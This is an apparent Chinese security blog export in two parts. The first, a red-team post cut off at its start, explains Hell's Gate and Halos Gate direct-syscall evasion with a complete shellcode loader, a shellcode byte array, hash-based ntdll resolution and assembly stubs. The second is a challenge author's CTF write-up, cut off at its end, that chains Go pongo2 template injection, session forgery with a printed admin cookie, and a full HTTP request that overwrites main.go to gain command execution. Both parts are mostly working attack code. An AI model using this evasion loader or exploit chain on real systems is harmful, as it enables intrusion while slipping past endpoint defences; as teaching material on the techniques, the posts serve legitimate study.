src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151933799.png"></p><ul><li>获得ntdll.dll的EAT（Export Address Table）的基地址</li></ul><p>​这个的前置知识就是PE文件结构</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151933676.jpeg" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetImageExportDirectory</span><span class="params">(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory)</span> </span>&#123;</span><br><span class="line"><span class="comment">// Get DOS header</span></span><br><span class="line">PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;</span><br><span class="line"><span class="keyword">if</span> (pImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get NT headers</span></span><br><span class="line">PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader-&gt;e_lfanew);</span><br><span class="line"><span class="keyword">if</span> (pImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the EAT</span></span><br><span class="line">*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过API哈希然后遍历ntdll.dll的EAT来找到对应的函数地址</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Table.NtAllocateVirtualMemory.dwHash = <span class="number">0xf5bd373480a6b89b</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">GetVxTableEntry</span>(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtAllocateVirtualMemory))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">Table.NtCreateThreadEx.dwHash = <span class="number">0x64dc7db288c5015f</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">GetVxTableEntry</span>(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtCreateThreadEx))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">Table.NtProtectVirtualMemory.dwHash = <span class="number">0x858bcb1046fb6a37</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">GetVxTableEntry</span>(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtProtectVirtualMemory))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">Table.NtWaitForSingleObject.dwHash = <span class="number">0xc6a2fa174e551bcb</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">GetVxTableEntry</span>(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtWaitForSingleObject))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x1</span>;</span><br></pre></td></tr></table></figure><ul><li>最后使用从ntdll.dll的EAT中获取的winAPI执行shellcode</li></ul><blockquote><p>分配内存页存储shellcode –&gt; 往内存页中写入shellcode –&gt; 修改内存页为可读可执行 –&gt; 在当前进程中创建新的线程 –&gt; 执行</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Payload</span><span class="params">(PVX_TABLE pVxTable)</span> </span>&#123;</span><br><span class="line">NTSTATUS status = <span class="number">0x00000000</span>;</span><br><span class="line"><span class="comment">// char shellcode[] = &quot;\x90\x90\x90\x90\xcc\xcc\xcc\xcc\xc3&quot;;</span></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&quot;</span></span><br><span class="line"><span class="string">&quot;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd&quot;</span></span><br><span class="line"><span class="string">&quot;\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\x63\x61\x6c\x63\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for the shellcode</span></span><br><span class="line">PVOID lpAddress = <span class="literal">NULL</span>;</span><br><span class="line">SIZE_T sDataSize = <span class="built_in">sizeof</span>(shellcode);</span><br><span class="line"><span class="built_in">HellsGate</span>(pVxTable-&gt;NtAllocateVirtualMemory.wSystemCall);</span><br><span class="line">status = <span class="built_in">HellDescent</span>((HANDLE)<span class="number">-1</span>, &amp;lpAddress, <span class="number">0</span>, &amp;sDataSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write Memory</span></span><br><span class="line"><span class="built_in">VxMoveMemory</span>(lpAddress, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Change page permissions</span></span><br><span class="line">ULONG ulOldProtect = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">HellsGate</span>(pVxTable-&gt;NtProtectVirtualMemory.wSystemCall);</span><br><span class="line">status = <span class="built_in">HellDescent</span>((HANDLE)<span class="number">-1</span>, &amp;lpAddress, &amp;sDataSize, PAGE_EXECUTE_READ, &amp;ulOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create thread</span></span><br><span class="line">HANDLE hHostThread = INVALID_HANDLE_VALUE;</span><br><span class="line"><span class="built_in">HellsGate</span>(pVxTable-&gt;NtCreateThreadEx.wSystemCall);</span><br><span class="line">status = <span class="built_in">HellDescent</span>(&amp;hHostThread, <span class="number">0x1FFFFF</span>, <span class="literal">NULL</span>, (HANDLE)<span class="number">-1</span>, (LPTHREAD_START_ROUTINE)lpAddress, <span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait for 1 seconds</span></span><br><span class="line">LARGE_INTEGER Timeout;</span><br><span class="line">Timeout.QuadPart = <span class="number">-10000000</span>;</span><br><span class="line"><span class="built_in">HellsGate</span>(pVxTable-&gt;NtWaitForSingleObject.wSystemCall);</span><br><span class="line">status = <span class="built_in">HellDescent</span>(hHostThread, FALSE, &amp;Timeout);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺道看下HellsGate的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.code </span><br><span class="line">HellsGate PROC; 获取系统调用号</span><br><span class="line">mov wSystemCall, 000h</span><br><span class="line">mov wSystemCall, ecx</span><br><span class="line">ret</span><br><span class="line">HellsGate ENDP</span><br><span class="line"></span><br><span class="line">HellDescent PROC; 系统调用，可以参考ntdll.dll中的反汇编代码</span><br><span class="line">mov r10, rcx</span><br><span class="line">mov eax, wSystemCall</span><br><span class="line"></span><br><span class="line">syscall</span><br><span class="line">ret</span><br><span class="line">HellDescent ENDP</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="HalosGate"><a href="#HalosGate" class="headerlink" title="HalosGate"></a>HalosGate</h2><p>HellsGate的缺点是它定位API时需要一个没有经过任何hook的ntdll.dll，因为获取API时的偏移都是硬编码的</p><p>倘如ntdll.dll被hook时，那么HalosGate就失效了，为了解决这个问题，HalosGate应运而生</p><p>光环之门的基本原理就是找到未被hook的系统调用，根据系统调用号的临近关系进行推测</p><p>重点看下findSyscallNumber、halosGateUp、halosGateDown这几个函数</p><ul><li>findSyscallNumber</li></ul><p>在jne error处检查是否被hook，如果没有则返回syscall号，源代码中不启用光环之门，而是继续地狱之门</p><p><code>cmp edi, [rcx]</code>：检查是否被hook如果有则返回error，启用光环之门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">findSyscallNumber PROC</span><br><span class="line">xor rsi, rsi</span><br><span class="line">xor rdi, rdi </span><br><span class="line">mov rsi, 00B8D18B4Ch   ; bytes at start of NTDLL stub to setup syscall in RAX</span><br><span class="line">mov edi, [rcx]         ; RDI = first 4 bytes of NTDLL API syscall stub (mov r10,rcx;mov eax,&lt;syscall#&gt;)</span><br><span class="line">cmp rsi, rdi</span><br><span class="line">jne error              ; if the bytes dont match then its prob hooked. Exit gracefully</span><br><span class="line">xor rax,rax            ; clear RAX as it will hold the syscall</span><br><span class="line">mov ax, [rcx+4]        ; The systemcall number</span><br><span class="line">ret                    ; return to caller</span><br><span class="line">findSyscallNumber ENDP</span><br></pre></td></tr></table></figure><ul><li>halosGateUp：向上获取SSN</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">halosGateUp PROC</span><br><span class="line">xor rsi, rsi</span><br><span class="line">xor rdi, rdi </span><br><span class="line">mov rsi, 00B8D18B4Ch   ; bytes at start of NTDLL stub to setup syscall in RAX</span><br><span class="line">xor rax, rax</span><br><span class="line">mov al, 20h            ; 32 * Increment = Syscall Up</span><br><span class="line">mul dx                 ; RAX = RAX * RDX = 32 * Syscall Up</span><br><span class="line">add rcx, rax           ; RCX = NTDLL.API +- Syscall Stub</span><br><span class="line">mov edi, [rcx]         ; RDI = first 4 bytes of NTDLL API syscall stub, incremented Up by HalosGate (mov r10, rcx; mov eax, &lt;syscall#&gt;)</span><br><span class="line">cmp rsi, rdi</span><br><span class="line">jne error              ; if the bytes dont match then its prob hooked. Exit gracefully</span><br><span class="line">xor rax,rax            ; clear RAX as it will hold the syscall</span><br><span class="line">mov ax, [rcx+4]        ; The systemcall number for the API close to the target</span><br><span class="line">ret                    ; return to caller</span><br><span class="line">halosGateUp ENDP</span><br></pre></td></tr></table></figure><ul><li>halosGateDown：向下获取SSN</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">halosGateDown PROC</span><br><span class="line">xor rsi, rsi</span><br><span class="line">xor rdi, rdi </span><br><span class="line">mov rsi, 00B8D18B4Ch   ; bytes at start of NTDLL stub to setup syscall in RAX</span><br><span class="line">xor rax, rax</span><br><span class="line">mov al, 20h            ; 32 * Increment = Syscall Down</span><br><span class="line">mul dx                 ; RAX = RAX * RDX = 32 * Syscall Down</span><br><span class="line">sub rcx, rax           ; RCX = NTDLL.API - Syscall Stub</span><br><span class="line">mov edi, [rcx]         ; RDI = first 4 bytes of NTDLL API syscall stub, incremented Down by HalosGate (mov r10, rcx; mov eax, &lt;syscall#&gt;)</span><br><span class="line">cmp rsi, rdi</span><br><span class="line">jne error              ; if the bytes dont match then its prob hooked. Exit gracefully</span><br><span class="line">xor rax,rax            ; clear RAX as it will hold the syscall</span><br><span class="line">mov ax, [rcx+4]        ; The systemcall number for the API close to the target</span><br><span class="line">ret                    ; return to caller</span><br><span class="line">halosGateDown ENDP</span><br></pre></td></tr></table></figure><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol><li><p><a href="https://blog.eonew.cn/2018-09-09.%E5%AE%9A%E4%BD%8DAPI%E7%9A%84%E5%8E%9F%E7%90%86.html">https://blog.eonew.cn/2018-09-09.%E5%AE%9A%E4%BD%8DAPI%E7%9A%84%E5%8E%9F%E7%90%86.html</a></p></li><li><p><a href="https://xz.aliyun.com/t/12885?time__1311=mqmhq+xjxGED/7NeBKnOQAnxD56D&alichlgref=https://www.google.com/#toc-17">https://xz.aliyun.com/t/12885?time__1311=mqmhq%2BxjxGED%2F7NeBKnOQAnxD56D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-17</a></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> RedTeam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HASHCTF-2024 出题笔记和心得</title>
      <link href="/2024/04/10/WriteUp/SDUCTF/"/>
      <url>/2024/04/10/WriteUp/SDUCTF/</url>
      
        <content type="html"><![CDATA[<p>很开心以web出题人的身份出现在这次比赛中，学到挺多的</p><p>附件地址：<a href="https://github.com/HongLaiCh3/CTF-Game">https://github.com/HongLaiCh3/CTF-Game</a></p><h2 id="go2RCE"><a href="#go2RCE" class="headerlink" title="go2RCE"></a>go2RCE</h2><p>考点：go SSTI、热部署</p><p>出题人：ch3</p><p>难度：困难</p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>SSTI的原理就不解释了，懂的都懂，不懂的自己google吧</p><p>SESSION_KEY在给大家的附件中是fake，需要自己通过漏洞泄露</p><p>这里有三个路由<code>/</code>，<code>/welcome</code>，<code>/welcome/username</code>，<code>/admin</code></p><p>然后去看对应的路由文件，Index里设置了session-name的session</p><p>然后welcome要求POST传username和skill</p><p>admin使用了pongo2模板来解析</p><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><h4 id="SSTI读取Session-Key"><a href="#SSTI读取Session-Key" class="headerlink" title="SSTI读取Session-Key"></a>SSTI读取Session-Key</h4><p>参考：<a href="https://tyskill.github.io/posts/gossti/">https://tyskill.github.io/posts/gossti/</a></p><p>这个b后端算是写得很刻意了。。</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826003.png" alt="image-20240328102028141"></p><p>妥妥模板注入</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826769.png" alt="image-20240328102107423"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826931.png" alt="image-20240328102159824"></p><p>泄露session-key后，拿去ascii解码，顺道填入最开始设置SESSION_KEY的环境变量的位置</p><p>接下来就是本地的session伪造了，既然有了session-key，直接本地改下，然后启动服务</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826266.png" alt="image-20240327162822609"></p><p>获得admin-session如下：</p><blockquote><p>MTcxMTA2NTkzNXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzaXqKrp-8lPsyq0EqYjYDyChtvEVjpT-5vNJCAFJBclw&#x3D;&#x3D;</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826986.png" alt="image-20240328102748286"></p><h4 id="Pongo2-SSTI文件写-热部署特性-实现RCE"><a href="#Pongo2-SSTI文件写-热部署特性-实现RCE" class="headerlink" title="Pongo2 SSTI文件写 + 热部署特性 &#x3D; 实现RCE"></a>Pongo2 SSTI文件写 + 热部署特性 &#x3D; 实现RCE</h4><p>具体的可以查下pongo2 SSTI以及context的相关文档，参考：<a href="https://dummykitty.github.io/go/2023/05/30/Go-pongo-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5.html">https://dummykitty.github.io/go/2023/05/30/Go-pongo-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5.html</a></p><p>poc:</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826066.png" alt="image-20240327164048893"></p><p>那么问题来了？可以任意读、任意写，但是不知道flag在哪，不妨想想怎么进一步getshell</p><p>由于我使用的是fresh热部署，当服务文件修改时，会重新编译执行go文件，此处也是RCE的办法</p><p>利用：</p><ul><li>读源码</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826758.png" alt="image-20240328182356447"></p><ul><li>然后写文件，多写一条RCE的路由（<del>考虑到没有校内vps，不然一般直接反弹shell</del>）</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin?name=%7B%25%20include%20c.SaveUploadedFile(c.FormFile(c.Request.Header.Filetype%5B0%5D),c.Request.Header.Filepath%5B0%5D)%20%25%7D</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:3000</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;103&quot;, &quot;.Not/A)Brand&quot;;v=&quot;99&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Filetype</span><span class="punctuation">: </span>file</span><br><span class="line"><span class="attribute">Filepath</span><span class="punctuation">: </span>/home/ctfer/app/main.go</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>csrftoken=q8pYXi0Pe5IGRo6rCTonyIMChfFpovj1; session-name=MTcxMTA2NTkzNXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzaXqKrp-8lPsyq0EqYjYDyChtvEVjpT-5vNJCAFJBclw==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=01f54ee8f2872c8a0d42d14f70cdc1fe</span><br><span class="line"></span><br><span class="line"><span class="language-stata">--01f54ee8f2872c8a0d42d14f70cdc1fe</span></span><br><span class="line"><span class="language-stata">Content-Disposition: <span class="keyword">form</span>-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;test.png&quot;</span></span></span><br><span class="line"><span class="language-stata">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-stata"></span></span><br><span class="line"><span class="language-stata">package main</span></span><br><span class="line"><span class="language-stata"></span></span><br><span class="line"><span class="language-stata">import (</span></span><br><span class="line"><span class="language-stata"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span></span><br><span class="line"><span class="language-stata"><span class="string">&quot;main/route&quot;</span></span></span><br><span class="line"><span class="language-stata"><span class="string">&quot;os&quot;</span></span></span><br><span class="line"><span class="language-stata"><span class="string">&quot;os/exec&quot;</span></span></span><br><span class="line"><span class="language-stata">)</span></span><br><span class="line"><span class="language-stata"></span></span><br><span class="line"><span class="language-stata">func main() &#123;</span></span><br><span class="line"><span class="language-stata"><span class="comment">//I don&#x27;t tell you the session key, can you find it?</span></span></span><br><span class="line"><span class="language-stata"><span class="comment">//err := os.Setenv(&quot;SESSION_KEY&quot;, &quot;fake_session_key&quot;)</span></span></span><br><span class="line"><span class="language-stata"><span class="keyword">err</span> := os.Unsetenv(<span class="string">&quot;GZCTF_FLAG&quot;</span>)</span></span><br><span class="line"><span class="language-stata"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</span></span><br><span class="line"><span class="language-stata"><span class="keyword">return</span></span></span><br><span class="line"><span class="language-stata">&#125;</span></span><br><span class="line"><span class="language-stata"><span class="keyword">err</span> = os.Setenv(<span class="string">&quot;SESSION_KEY&quot;</span>, <span class="string">&quot;th1s_1s_w3b_g0_ch4l1eng3&quot;</span>)</span></span><br><span class="line"><span class="language-stata"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</span></span><br><span class="line"><span class="language-stata"><span class="keyword">return</span></span></span><br><span class="line"><span class="language-stata">&#125;</span></span><br><span class="line"><span class="language-stata">r := gin.Default()</span></span><br><span class="line"><span class="language-stata">r.<span class="built_in">GET</span>(<span class="string">&quot;/&quot;</span>, route.Index)</span></span><br><span class="line"><span class="language-stata">r.<span class="built_in">GET</span>(<span class="string">&quot;/welcome&quot;</span>, route.Welcome)</span></span><br><span class="line"><span class="language-stata">r.<span class="built_in">GET</span>(<span class="string">&quot;/welcome/:username&quot;</span>, route.Welcome)</span></span><br><span class="line"><span class="language-stata">r.<span class="built_in">GET</span>(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span></span><br><span class="line"><span class="language-stata"></span></span><br><span class="line"><span class="language-stata">r.<span class="built_in">GET</span>(<span class="string">&quot;/getflag&quot;</span>, func(c *gin.Context) &#123;</span></span><br><span class="line"><span class="language-stata">cmd := exec.Command(<span class="string">&quot;ls&quot;</span>)</span></span><br><span class="line"><span class="language-stata"><span class="comment">// cmd := exec.Command(&quot;cat&quot;,&quot;hhhnb_f14g_0h_y0u_g0t_1t_6666666&quot;)</span></span></span><br><span class="line"><span class="language-stata">flag, <span class="keyword">err</span> := cmd.CombinedOutput()</span></span><br><span class="line"><span class="language-stata"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</span></span><br><span class="line"><span class="language-stata">c.<span class="built_in">String</span>(500, <span class="string">&quot;error&quot;</span>)</span></span><br><span class="line"><span class="language-stata">&#125;</span></span><br><span class="line"><span class="language-stata">c.<span class="built_in">String</span>(200, <span class="built_in">string</span>(flag))</span></span><br><span class="line"><span class="language-stata">&#125;)</span></span><br><span class="line"><span class="language-stata"></span></span><br><span class="line"><span class="language-stata"><span class="keyword">err</span> = r.<span class="keyword">Run</span>(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span></span><br><span 